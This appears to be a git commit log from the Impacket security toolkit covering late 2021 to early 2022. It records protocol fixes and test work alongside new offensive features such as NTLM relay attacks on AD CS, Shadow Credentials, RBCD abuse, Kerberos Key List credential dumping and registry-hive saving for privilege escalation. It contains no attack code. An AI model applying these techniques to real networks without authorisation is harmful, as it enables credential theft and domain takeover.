commit 3f61baa31ba02ec07df2f0bf9c5ff2bae30f0070
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Feb 17 09:25:24 2022 -0800

    Dropping Python 2.7 support and adjusting doc
    
    * Dropping Python 2.7 support. We're going to run it in GitHub Actions/Tox but only as experimental to have visibility.
    * Arranged README and updated installation steps.
    * Added latest ChangeLog entries.
    * Added tox-gh-actions to simplify workflow.

commit 9fee58daf083aba517e80de90a621aa90d44ebb4
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Thu Feb 17 01:49:48 2022 +0100

    Added a `backup` method saving SAM SYSTEM and SECURITY "at once"
    Co-authored-by: scopedsecurity <zachhanley@gmail.com>

commit ae1903d38be788f50849b98107d633b145bfe731
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Thu Feb 17 01:09:11 2022 +0100

    Fixed access denied on `SECURITY` hive
    Co-authored-by: scopedsecurity <zachhanley@gmail.com>

commit cfed931afeb16a44e8e45f00809c32eb88ff531c
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Feb 16 15:18:46 2022 +0100

    Adding save function for Backup Operators to Domain Admin exploitation

commit 275681da6b8ec3d5b1109fb657ebb8d09072f28b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Feb 9 11:58:17 2022 -0800

    Fixed some escape warnings due to regex strings

commit 1c9624c0ff435410af17d1b24a60a05f3010be9c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Feb 9 11:10:30 2022 -0800

    CCache: Added some unit tests
    
    - Parsing v3 and v4 ccache files to check #1106 (and not support for v1 and v2)
    - Parsing creds from kirbi to check #1254
    - Checking #1166 parseFile function

commit f73c313a56678da2d47fff906036cb3fcc0952a7
Merge: b28496a2 435fba1a
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Wed Feb 9 15:31:22 2022 +0100

    Merge pull request #4 from nodauf/shadowcredentials
    
    Use a temporary variable

commit b28496a21c95f2dd282bb91ea27a48acfcf07588
Merge: c95f23b0 769c3196
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Wed Feb 9 15:30:41 2022 +0100

    Merge branch 'SecureAuthCorp:master' into shadowcredentials

commit ce1017a91c38e1d5557111069bc36ce8a1769b19
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Feb 8 22:41:52 2022 -0300

    CCache: Modified fromKRBCRED function used to load a Kirbi file
    - Added authtime field
    - Changed keyvalue type
    - It should fix #1056

commit 769c3196124af64d7bc08d51ae4b651e61a87037
Merge: 09163293 d595d33c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 8 12:24:05 2022 -0300

    Merge pull request #1188 from SAERXCIT/default-template
    
    Default ADCS template to "Machine" or "User" whether relayed account name ends with "$"

commit 09163293a954a431febab911eefc64efce5209d4
Merge: ed7082cd 569281ae
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 8 12:22:39 2022 -0300

    Merge pull request #1214 from SAERXCIT/ldaprelay-getadcsenrollmentsvc
    
    LDAP attack: dump ADCS enrollment services and certificate templates info

commit 435fba1a73bdd32c6ba1ed34b4aee5e0368f1959
Author: Nodauf <nodauf@krutt.org>
Date:   Sun Feb 6 10:15:28 2022 +0400

    Fix issue when two differents users tried to do the attacks without the target being specified

commit c95f23b08b59215ab6190036967de5dea65474bb
Merge: fe744026 ed7082cd
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Sat Feb 5 12:56:08 2022 +0100

    Merge branch 'SecureAuthCorp:master' into shadowcredentials

commit ed7082cd0bc0d951f6eefb0a98c4c1360fe1a8a2
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 3 15:58:19 2022 -0300

    Updated changelog and some script headers.

commit 2abda3c8b3906b882f02816d05a900a435fd4fe9
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 3 15:57:57 2022 -0300

    Tests: Added new test cases in MS-PAR and MS-RPRN.

commit a67fa605077d351ee93b52a1514b7dc1671fbb16
Merge: d8679837 71a475c3
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Feb 3 15:14:10 2022 -0300

    Merge pull request #1193 from raithedavion/master
    
    Added "GetDriverDirectory" functions to MS-PAR and MS-RPRN.

commit 71a475c33ab2f6f397f40d502b1f773279869cfc
Author: raithedavion <raithedavion@gmail.com>
Date:   Thu Feb 3 10:54:05 2022 -0700

    Update par.py
    
    Removed ('pcbNeeded', DWORD) from RpcAsyncGetPrinterDriverDirectory definition, and renamed comment on line 403 per the request of 0xdeaddood.

commit 47737303dc3167f55df16d3b26e2c69f5f292c05
Author: raithedavion <raithedavion@gmail.com>
Date:   Thu Feb 3 10:52:26 2022 -0700

    Update rprn.py
    
    Removed ('pcbNeeded', DWORD) in RpcGetPrinterDriverDirectory as requested by 0xdeaddood.

commit d8679837a66b24df9bee0899b2dafb131c39496b
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Feb 1 19:16:45 2022 -0300

    Updated changelog and some script headers

commit 99f1b207af71420fcc52b67befde2b9488239c9f
Merge: a7095c75 981eb5bc
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 1 18:51:30 2022 -0300

    Merge pull request #1209 from simondotsh/ms-dssp
    
    Implementation of MS-DSSP with a short example.

commit a7095c75ccbbd4c1bc5e53607699a7ae19a8647e
Merge: badf09d5 93fb6ec9
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 1 18:49:32 2022 -0300

    Merge pull request #1190 from CCob/master
    
    Initial support for raw NTLM relay server

commit fe744026ec2069f169d4aab9d05b32c4743cb962
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Tue Feb 1 16:38:16 2022 +0100

    Adding Shadow Credentials attack to ntlmrelayx
    Co-authored-by: Tw1sm <mcreel31@gmail.com>
    Co-authored-by: nodauf <nodauf@users.noreply.github.com>

commit badf09d5c5733d9bda03eef4978ce4f3238e21d3
Merge: df5a4538 7aabdb16
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jan 31 20:04:24 2022 -0300

    Merge pull request #1200 from rmaksimov/fix-indent
    
    fix indent in addcomputer.py

commit df5a4538220b703321782f296128470d2444230d
Merge: e007046d ecc3008d
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jan 31 13:24:44 2022 -0300

    Merge pull request #1247 from SecureAuthCorp/test-refactor
    
    Refactor of testing infrastructure

commit ecc3008d3bad6e53204d38e93f3bda1d99b0000c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jan 28 17:17:59 2022 -0300

    Tests: some fixes to NRPC tests
    - Updated the Netlogon Authenticator computation.
    - Modified the authenticate function. Now, the user's machine connects to the server.
    - Marked some tests as Xfail due to the Zerologon patch.

commit e007046def3d7e2afa27dd83cb9e53f452099175
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jan 28 17:02:56 2022 -0300

    Removed non-ASCII char that's failing (#1239)
    
    This is failing in Python 2.7 and throwing errors on other version, but wasn't catched but in the new test refactor.

commit 0361250ea4a531bb9262dad0b8703c392d155cd4
Merge: 84d254d9 7454cb38
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jan 28 16:40:17 2022 -0300

    Merge branch 'master_Impacket' into test-refactor

commit 7454cb38bdf29a71de3f89686ca5f31cb02e5383
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jan 28 16:10:28 2022 -0300

    NRPC: Added a function to compute the Netlogon Authenticator at client-side

commit 572fbd4c2d6e76ab9e5c05d23dc6761cbbca4aa3
Author: Maltemo <maltemo@protonmail.com>
Date:   Mon Jan 24 17:59:33 2022 +0100

    Changing corrupted source link

commit 32aea4c96e59896d718e34ce925164f6ed13e68a
Author: zblurx <seigneuret.thomas@pm.me>
Date:   Fri Jan 21 15:41:44 2022 +0100

    disable-multi smb added

commit f139e11255dedfc0f5836c9b3c0bb93c40307d8c
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Thu Jan 20 18:04:59 2022 +0100

    ntlmrelayx can have multiple http listeners at the same time

commit 84d254d935bb1707ed8de8f9d04da71d272ffbff
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 14:47:52 2022 -0300

    Tests: Make SCMR tests more idempotent (#1238)
    
    - If a previous test run broke, the services was left on the target and thus create calls will fail. Implemented an open or create helper function to solve that.

commit 12de27dcc9b88361dee74f4ed1c397e383c9964a
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 10:19:25 2022 -0300

    NRPC: Fixed NetrLogonControl2(Ex)Response structures (#1235)
    
    - Structures for the `NetrLogonControl2` and `NetrLogonControl2Ex` call responses were using `NETLOGON_CONTROL_DATA_INFORMATION` instead of `NETLOGON_CONTROL_QUERY_INFORMATION`.
    
    Reference: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/df7e5dd1-ebcc-4754-9da0-2e0bded82d29

commit 6a05157e67b40295226603bbfec69ea4eb39be74
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 10:18:48 2022 -0300

    DHCPM: added more error codes and fixed Client Info array structure (#1234)
    
    - Added error codes and messages from the specs.
    - Fixed `DHCP_CLIENT_INFO_ARRAY_V5` which was using `LPDHCP_CLIENT_INFO_V4_ARRAY` instead of `LPDHCP_CLIENT_INFO_V5_ARRAY` member.

commit 1ef157f8b7f0484c6bf0b6e6c786978631a3f61e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 10:17:38 2022 -0300

    ATSVC: Fixed NetrJobEnum struct (#1233)
    
    - `NetrJobEnum` incorrectly defined `pResumeHandle` as `DWORD` instead of `LPDWORD`.

commit 35700a999af1e4411e58f9462adc2098884c24f1
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jan 18 18:29:25 2022 -0300

    Tests: Added some basic test cases for [MS-PAR] (#1237)
    
    - Testing `RpcAsyncEnumPrinters` and `RpcAsyncEnumPrinterDrivers` calls

commit 4c7a68f500a1fba739519b573b22a6063ec87177
Merge: a8b863a5 7722d094
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jan 18 15:40:03 2022 -0300

    Merge pull request #1236 from SecureAuthCorp/test-refactor-passrate
    
    Tests: improving refactor passrate

commit 7722d094a329494d581a70a41eb0e03d5d0c0807
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jan 18 05:00:27 2022 -0800

    Tests: arranging DHCPM test cases

commit 3b2c07b16237c4cb7f4310519bdb68ae38c0b16c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jan 17 13:21:22 2022 -0800

    Tests: Fixed broken SRVS test case
    
    Using a more generic exception catch for when we're closing ourselvex

commit e6b2f207fc7a76d461d53fec5fd3f407db751755
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jan 17 12:38:27 2022 -0800

    Tests: some fixes to NRPC tests to get back to previous pass rate

commit 10e53952e64e290712d49e263420b70b681bbc73
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jan 5 15:13:06 2022 -0300

    Removed unnecessary PY3 import

commit 2ab3136c0f187d6489f3c79b8e3917c04ca8102c
Author: hugo-syn <hugo.vincent@synacktiv.com>
Date:   Wed Jan 5 10:12:43 2022 +0100

    fix log

commit 981923da0a480327b385a5c5b096a6a5122cef04
Author: hugo-syn <hugo.vincent@synacktiv.com>
Date:   Wed Jan 5 09:58:56 2022 +0100

    ADCS ESC1 and ESC6 support

commit 14506dd6bcf7e8045dca08175023f1c592d19ecc
Author: Lukas Kuzmiak <lukash@backstep.net>
Date:   Sat Dec 18 22:34:58 2021 -0800

    Fix for "TypeError: sequence item 0: expected str instance, bytes found"

commit e155103ea2637c3998af2680ee3a3efdb9b94072
Author: capnkrunchy <gkempf@issgs.net>
Date:   Fri Dec 10 18:37:36 2021 -0600

    Add rename_computer and modify add_computer in ldap interactive shell

commit a8b863a50ddbc5f73226d24df3a57b31fcf81b42
Merge: 91694559 728d7a2e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 20:26:05 2021 -0300

    Merge pull request #1220 from SecureAuthCorp/test-refactor-py310
    
    Tests: Enable Python 3.10 as experimental

commit 728d7a2e2e9e275bbb2503b518774c793f56077e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 15:19:59 2021 -0800

    Tests: Fixed Python 3.10 version for GH Actions

commit 79193f50ec95789ae61cbb5cf1e8d03b33ab5ebf
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 06:37:24 2021 -0800

    Moved Python 2.7 as experimental

commit c048db37cb64efa1ec29c80f1b012c65fbee410a
Merge: 83fcc47e 91694559
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 06:21:48 2021 -0800

    Merge branch 'test-refactor' into test-refactor-py310

commit 91694559e9624b100d3976fe92d432e819d5992c
Merge: 1893ce7f ee3d988b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 11:20:22 2021 -0300

    Merge pull request #1219 from SecureAuthCorp/test-refactor-catchup
    
    Test refactor catchup

commit ee3d988b06f6c5bb7f1b0c03a29a31959f9d2b43
Merge: 1893ce7f 1dad8f7f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 06:05:46 2021 -0800

    Merge branch 'master' into test-refactor-catchup

commit 569281ae5b4224db314ea79678b3b83e72a0024e
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Sun Nov 21 13:01:03 2021 +0100

    Fix typo

commit d7c434dd5389f22ac0fefeacc52488935703720d
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Sun Nov 21 12:30:07 2021 +0100

    Output principals who can enroll on each enrollment service and template

commit d2e981f7f60873d0fdff44cb20f905c7501982e9
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Fri Nov 19 16:05:52 2021 +0100

    Add LDAP Relay to dump ADCS enrollment services info

commit 1b0b3383c486dec6851dcea6e3517e8814f00d7f
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Nov 15 18:06:11 2021 -0300

    Added paramater validation

commit 91f7bb3a527ef1bdcb418e3efd6890faeb4df9d4
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Nov 11 00:17:00 2021 -0300

    The Kerberos Key List Attack
    Implementation of a new credential dumping method. This PR includes:
    - examples/keylistattack.py: A new example with the implementation of the attack.
    - examples/secretsdump.py: A new option (use-keylist) to dump credentials with the new attack instead of default the DRSUAPI method.
    - impacket/examples/secretsdump.py: Modifications to the library to support the new attack.

commit 981eb5bc4ab6d0ef73d1bf64e4b3f040796a752c
Author: simondotsh <simon747sh@gmail.com>
Date:   Tue Nov 9 17:54:21 2021 -0500

    Added missing socket close

commit 85eed9d4dcfc109f7790098cbc7745196a9481b7
Author: simondotsh <simon747sh@gmail.com>
Date:   Sun Nov 7 16:20:08 2021 -0500

    Added missing new line at the end of files

commit c94ccfa908ec359f171f7a71d6e0b0ffde04263b
Author: simondotsh <simon747sh@gmail.com>
Date:   Sun Nov 7 16:12:52 2021 -0500

    Implementation of MS-DSSP with a short example

commit 4039f5c4e1a7dcf3804d0d8e352c3c7bd799b5d4
Author: Jonathan <w0rmh013@users.noreply.github.com>
Date:   Mon Nov 1 23:26:15 2021 +0200

    Fixed entropy parameter handling in dpapi.py/unprotect

commit 7aabdb16895cc2af5808e395766c10f008a89a7f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sat Oct 30 23:41:19 2021 +0300

    fix indent in addcomputer.py

commit 921cc05342d833c116b0afbdd6799a105be6a680
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sat Oct 30 22:25:45 2021 +0300

    remove duplicate code in rbcd.py

commit d61c9ef738101ecb86b190ac6fad4a9eca41a842
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Fri Oct 22 02:00:19 2021 +0300

    remove incompatible changes with python2

commit 435dadfe61c980f561ae70967783fbac6ee82ea0
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Sep 6 11:40:41 2021 +0300

    clean up the code

commit 1409b455c842a78fab375d9f72675f1c762d319e
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Sep 6 11:35:46 2021 +0300

    add the parseFile class method and remove all the duplicate code

commit 1dad8f7f9fee82d63c876e781f2d2bab3975f2bb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 12:32:55 2021 -0300

    And going back to dev version

commit 265ce178fc1afcf942e2e1fabd7c8fab64e94893
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 12:27:35 2021 -0300

    Revert "And going back to dev version"
    
    This reverts commit ef65bdc3479dea0c7f6aea14ba2f96b3b9396892.

commit ef65bdc3479dea0c7f6aea14ba2f96b3b9396892
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 12:19:24 2021 -0300

    And going back to dev version

commit 0d848d7ea52e59a49ad300866b8996ce401c2c29
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 11:55:46 2021 -0300

    About to tag a release

commit ea023b2813ba512cbd556e59415fd020b9fbc423
Merge: 4229481c 62b8769c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Oct 26 12:28:19 2021 -0300

    Merge pull request #1197 from ShutdownRepo/rbcd
    
    Dup fix and file mode changed to 775

commit 62b8769c3b1c7fe675bdc72e7aa64e1a72fb584e
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Mon Oct 25 17:47:21 2021 +0200

    Dup fix and file mode changed to 775

commit 4229481c26c2021651d2dad446401621cf5d6fa7
Merge: b66cd365 b5599da0
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 22 18:28:43 2021 -0300

    Merge pull request #1183 from ShutdownRepo/getST-for-kcd-kerberos-only
    
    Added support for a custom additional ticket for S4U2Proxy

commit b5599da0224491e4c31c1f1314c4ed9f716d057c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 22 18:10:44 2021 -0300

    Fixed typos

commit b66cd365ff935e3541686dafae2b72f955b297d0
Merge: 20ccf828 4080879f
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 22 17:14:07 2021 -0300

    Merge pull request #1108 from ShutdownRepo/rbcd
    
    Added rbcd attack script

commit 4080879f63085e83a8d14507f624390c39501f94
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Fri Oct 22 22:00:28 2021 +0200

    Update examples/rbcd.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 20ccf8281a6c21b4e64b11fb391158da5dbf1242
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Oct 21 17:37:06 2021 -0300

    Removed unnecessary anonymous login handling.

commit 1b74b06fa19e82c743b443698b1ffe0ec2571c7a
Merge: c0ec6102 1c3fdaee
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 21 17:11:20 2021 -0300

    Merge pull request #1179 from ly4k/master
    
    Disable anonymous logon in ntlmrelayx

commit d595d33c2b08f238cbc204448930b09aabfd391d
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Thu Oct 21 10:18:48 2021 +0200

    Don't override template for whole attack, just for current relay

commit 115518771263a2f0d97e29201773136f14e8be7d
Author: raithedavion <raithedavion@gmail.com>
Date:   Tue Oct 19 16:14:13 2021 -0600

    Update requirements.txt
    
    Removed temporary cryptography requirement.

commit 5d87198c01ced2cb65b610d0ec97853c1f9ecc09
Author: raithedavion <raithedavion@gmail.com>
Date:   Tue Oct 19 14:34:44 2021 -0600

    MS-PAR and MS-RPRN modifications.
    
    Added MS-PAR RpcAsyncGetDriverDirectory and MS-RPRN RpcGetDriverDirectory to par.py and rprn.py respectively

commit 93fb6ec903854b4512bb8ff56eb5022c47b178d9
Author: CCob <CCob@users.noreply.github.com>
Date:   Sun Oct 17 21:22:43 2021 +0100

    Initial support for raw NTLM relay server for lsarelayx (and other third party relay tools)

commit c0ec61022de20ea06724ec04d7c925c4c56b1c9c
Merge: d5839302 139e4505
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 15 12:51:34 2021 -0300

    Merge pull request #1174 from p0dalirius/master
    
    Added parsing of LSA's Security Questions Security Answers structure version 1.0

commit 4edbf1453fc4295011c0bc28adc99a64e235abe7
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Fri Oct 15 12:33:29 2021 +0200

    Default ADCS template to "Machine" or "User" whether relayed account name ends with "$"

commit 50d1ec9e809b6c79a7f75c46599e432f21a83c9f
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Fri Oct 15 12:02:37 2021 +0200

    Co-authored-by: GeisericII <g.giacobbe1@outlook.it>

commit 139e4505bae534590aa4d62f1a809717116ccb18
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri Oct 15 08:48:51 2021 +0200

    Update secretsdump.py

commit d5839302a46e279902c87b3adb434c571c5040ad
Merge: 3ff7e6f2 d4d60954
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 16:18:57 2021 -0300

    Merge pull request #1175 from p0dalirius/fixing_psexec_encodings
    
    Fixes #1079 psexec.py decoding problems on multi bytes characters

commit 3ff7e6f229627f10b738796156bd44f342874836
Merge: ff813e45 3fe2d73a
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 15:36:33 2021 -0300

    Merge pull request #1101 from ExAndroidDev/ntlmrelayx-adcs-attack
    
    Implementation of AD CS attack in ntlmrelayx.py

commit ff813e457b4c3415d89b21fa1c203074b401c935
Merge: cf03f344 f40f86e8
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 15:07:38 2021 -0300

    Merge pull request #1160 from Gifts/master
    
    Implementing reg.py ADD/DELETE functionality

commit cf03f34440941259db435e77020bb4f70ae1bc63
Merge: bbdabd81 679d90cf
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 11:54:42 2021 -0300

    Merge pull request #899 from Rcarnus/ldapAttack
    
    ldapattack: fix error when trying to escalate with machine account

commit bbdabd81753e1066db47146f9f53b89c435f66e2
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Oct 14 11:44:12 2021 -0300

    Added anonymous session handling in httprelayserver.py
    It should fix #1132

commit f40f86e846b718162c27f8b2c1d4332e4b32ac06
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Thu Oct 14 15:39:13 2021 +0300

    Fix argument help to include HKCR (HKEY_CLASSES_ROOT)
    Added relevant example to update empty value of Key.

commit 8c5eb3f53f9251400409cb59d6e3669ed084f032
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Wed Oct 13 19:22:35 2021 +0300

    Refactoring duplicate code to __strip_root_key function

commit 3fe2d73ae855d81bca73de75b5bda520c5b3feb1
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Wed Oct 13 15:22:15 2021 +0200

    Refactored httpattack.py, implemented AD CS attack as a submodule

commit 76f39926559b8e1af81aafaab2fac5dee97f8bf3
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Sun Oct 10 18:47:38 2021 +0200

    Added -additional-ticket feature for S4U2Proxy for KCD Kerberos only abuse

commit d4d60954aea3ddb0fc1e3cbfd1fdff6b81f02e68
Author: p0dalirius <podalirius@protonmail.com>
Date:   Fri Oct 8 12:18:08 2021 +0200

    Updated prompt regex
    Removed debug comments

commit 1c3fdaeed7d7b907b0f44d6b88dea8c24364f382
Author: ollypwn <53348818+ollypwn@users.noreply.github.com>
Date:   Wed Oct 6 20:58:45 2021 +0200

    Disable anonymous logon in ntlmrelayx
    
    By default, SMBSERVER allows anonymous logon. For ntlmrelayx, this
    is not desired since we're not interested in relaying an anonymous
    session, and ntlmrelayx even skips anonymous logons. After the patch for
    the PetitPotam exploit, the service now tries to logon with an anonymous
    session, but if we're returning STATUS_ACCESS_DENIED, the service will
    continue to NTLM authentication. This patch will create a new option for SMBSERVER
    that can disable anonymous logon via config_parser/serverConfig.
    Anonymous logon sessions will now return STATUS_ACCESS_DENIED.

commit e0751ae142713439ae46d1fa935d14403d48b3f6
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Oct 3 14:02:18 2021 +0200

    Fixes #1079 psexec.py decoding problems on multi bytes characters, with py2 support

commit f0a3917d589c43166b1516141732577241bc56de
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Oct 3 13:26:36 2021 +0200

    Fixes #1079 psexec.py decoding problems on multi bytes characters

commit 25c74b237baa88289c5b9064fc2d1d983f908a39
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri Oct 1 10:36:13 2021 +0200

    Update secretsdump.py

commit f53eb5fc913899821c45cd951b3c8f8d9c309c55
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri Oct 1 10:35:07 2021 +0200

    Update secretsdump.py

commit 8cd1943f6e79f008c4e08b2ca705eff1e3177b8b
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Thu Sep 30 01:06:31 2021 +0300

    Update debug message

commit f2eb3796a3631184efeeb1ab46bee8c2f151cde2
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Sep 29 11:09:44 2021 +0200

    Small edits to allow RBCD attack from user account

commit 7298b27fd3d0016788e4c1691ce6c75568031eba
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Sep 28 22:45:30 2021 +0300

    Update debug message

commit 14e2ef47cff6b07239a19e7e3e91405b6ec8fa02
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Sep 28 22:42:04 2021 +0300

    Process target domain and alt domain separately

commit ff7c521aa65c8459789585ccb5734c6e1d65f0fb
Merge: 2f18e484 19ce514e
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Sep 28 15:26:30 2021 -0300

    Merge pull request #1169 from rmaksimov/fix-typos
    
    fix typos

commit 2f18e484a6e7e4f9fce3d62dac4fe621486067ab
Merge: 5a7a7ada 4c0534b1
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Sep 28 15:24:00 2021 -0300

    Merge pull request #1170 from rmaksimov/fix-ldap-misc
    
    fix displaying destination port number in ldap.py

commit 5a7a7ada6a6192560052f7089b1cffaa1fe16e92
Merge: d2e939d1 5c25bab4
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Sep 28 15:21:07 2021 -0300

    Merge pull request #1168 from rmaksimov/refactor-crypto
    
    fix typos and remove unnecessary condition

commit 70d77f6669d5bea7f422d552658ccbdcd68c65d4
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Sep 28 21:18:46 2021 +0300

    Edit option name

commit 4c0534b10151c008afcafb998ee583d261b95c35
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Jan 31 03:32:15 2021 +0300

    fix displaying destination port number

commit 19ce514e0391912054007d2fc37c98776cfbbe17
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Sep 6 12:33:11 2021 +0300

    fix typos

commit 84a73dc038f098b8fff2ebb5f8309e9399561272
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Mon Sep 27 23:38:48 2021 +0300

    Remove f-strings for Python 2 support

commit d2e939d192075403176cffc5f2c88b222713f69d
Merge: c7bc76f8 9725f5b4
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Sep 27 16:22:08 2021 -0300

    Merge pull request #1119 from snovvcrash/smbpasswd
    
    Change user password providing NTLM hashes instead of a plaintext value

commit 9725f5b4b70927e4e86bf6a3dd4a447f155ffe70
Merge: 65663921 c7bc76f8
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Sep 27 16:13:08 2021 -0300

    Merge branch 'master' into smbpasswd

commit a28a7f86ae6b14fec3da59ebe3e1a6b0b7236d2f
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sun Sep 26 22:40:57 2021 +0300

    Add alternative credentials options

commit 65663921b2926aeddcfe14ec69c917da36c93638
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:47:52 2021 +0300

    Refactor target string parsing

commit dc2119ec3c1b78f5d65a18ed7159f934b9faba11
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:53 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 71b5da37ac246c2b53a2eef1e17c1c39d5bcb2eb
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:44 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit a3bc8422dea16f5cd8be3e62627916d070c71422
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:32 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit a3eaab5723c110a9f10de5b03992339593490ff5
